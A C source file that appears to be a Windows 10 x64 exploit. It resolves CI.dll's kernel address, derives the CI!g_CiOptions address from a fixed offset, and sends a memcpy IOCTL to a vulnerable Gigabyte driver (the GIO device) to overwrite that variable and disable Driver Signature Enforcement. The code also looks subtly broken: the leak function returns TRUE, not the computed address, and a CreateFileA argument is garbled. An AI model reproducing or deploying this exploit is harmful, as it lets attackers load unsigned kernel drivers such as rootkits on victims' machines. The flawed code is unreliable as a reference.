
#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <string.h>

#pragma comment(lib,"ntdll.lib")

typedef struct _GIGABYTE_MemcpyStruct {
    ULONG64 dst;
    ULONG64* src;
    DWORD size;
} GIGABYTE_MemcpyStruct;

typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;

#define MEMCPY_IOCTL 0xC3502808

BOOL leakCiOptions()
{
    PRTL_PROCESS_MODULES SystemInformation;
    SystemInformation = (PRTL_PROCESS_MODULES)VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, SystemInformation, 1024 * 1024, NULL);
    PVOID CiDllKernelBase = NULL;

    for (ULONG i = 0; i < SystemInformation->NumberOfModules; i++)
    {
        if (strcmp((char*)SystemInformation->Modules[i].FullPathName, "\\SystemRoot\\system32\\CI.dll") == 0)
        {
            // printf("%s\n", SystemInformation->Modules[i].FullPathName);
            CiDllKernelBase = SystemInformation->Modules[i].ImageBase;
            printf("[+] Kernelmode Address (CI.dll) : 0x%p\n", CiDllKernelBase);
        }
    }

    HMODULE loadCiDll = LoadLibraryExA("CI.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);

    PBYTE UsermodeCiInitialize = NULL;
    UsermodeCiInitialize = (PBYTE)GetProcAddress(loadCiDll, "CiInitialize");

    ULONG64 KernelmodeCiInitialize = (ULONG64)(UsermodeCiInitialize - (PBYTE)loadCiDll + (PBYTE)CiDllKernelBase);
    printf("[+] Kernelmode Address (CI!CiInitialize) -  0x%p\n", KernelmodeCiInitialize);

    ULONG64 KernelmodeCiOptions = KernelmodeCiInitialize - 0x9eb8;
    printf("[+] Kernelmode Address (CI!g_CiOptions) -  0x%p\n", KernelmodeCiOptions);

    return TRUE;

}

void disableDSE(ULONG64 gCiOptionsKernelAddress)
{
    GIGABYTE_MemcpyStruct inputBufferStruct;
    ULONG64* CiOptionsValue = (ULONG64*)malloc(sizeof(ULONG64));

    *CiOptionsValue = 0xe;

    inputBufferStruct.dst = gCiOptionsKernelAddress;
    inputBufferStruct.src = CiOptionsValue;
    inputBufferStruct.size = 1;

    HANDLE openHandle = CreateFileA("\\\\.\\GIO", (GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE), 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (openHandle == INVALID_HANDLE_VALUE)
    {
        printf("[!] Failed to open a device handle\n");
    }
    else {
        LPVOID lpOutBuffer[0x30] = { 0 };
        DWORD lpBytesReturned = 0;
        DeviceIoControl(openHandle, MEMCPY_IOCTL, (LPVOID)&inputBufferStruct, sizeof(inputBufferStruct), (LPVOID)&lpOutBuffer, sizeof(lpOutBuffer), &lpBytesReturned, 0);
    }

    CloseHandle(openHandle);
}

int main()
{

    //printf("Bypass DSE by disbaling CI!g_CiOptions - Windows 10 x64\n\n");

    ULONG64 gCiOptionsKernelAddress = leakCiOptions();
    
    disableDSE(gCiOptionsKernelAddress);


    return 0;
}
